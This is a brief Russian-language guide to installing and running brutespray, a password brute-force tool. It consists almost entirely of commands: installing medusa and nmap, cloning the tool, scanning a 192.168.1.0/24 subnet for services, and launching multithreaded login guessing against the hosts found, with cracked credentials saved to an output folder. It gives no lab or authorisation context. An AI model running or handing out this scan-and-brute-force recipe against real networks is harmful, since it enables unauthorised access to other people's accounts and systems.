Установка зависимостей 
sudo apt install medusa nmap git
sudo pip install argcomplete
Сам скрипт и базовые словари качаются так 
git clone git@github.com:x90skysn3k/brutespray.git
Для быстрого доступа можно сделать 
sudo cp brutespray/brutespray.py /usr/local/bin/brutespray
Собираем нужное с помощью nmap (nmap --help) 
sudo nmap -sS -sV 192.168.1.0/24 -vv -oA test
Запускаем брутфорс в 5 потоках по 3 хостам (brutespray --help) 
brutespray -f test.nmap -t 5 -T 3
В brutespray-output/ будут лежать удачные подборы логин+пароль
